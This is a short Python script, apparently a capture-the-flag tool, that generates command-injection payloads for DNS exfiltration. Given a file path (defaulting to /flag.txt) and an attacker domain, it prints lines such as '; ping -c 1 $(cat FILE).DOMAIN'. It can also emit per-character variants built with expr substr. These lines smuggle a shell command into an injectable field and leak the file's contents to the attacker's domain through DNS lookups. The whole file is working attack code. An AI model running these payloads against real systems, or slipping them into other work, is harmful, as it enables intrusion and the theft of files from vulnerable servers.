import argparse

parser = argparse.ArgumentParser(description="DNS Exfiltration Payload Generator")
parser.add_argument("--file", default="/flag.txt", help="File to exfiltrate")
parser.add_argument("--domain", required=True, help="Attacker domain")
parser.add_argument("--per-char", action="store_true", help="Generate per-character payloads")

args = parser.parse_args()

if args.per_char:
    print("# Per-character DNS exfiltration")
    for i in range(1, 50):  # Max length
        print(f'; ping -c 1 $(expr substr $(cat {args.file}) {i} 1).{args.domain}')
else:
    print(f'; ping -c 1 $(cat {args.file}).{args.domain}')
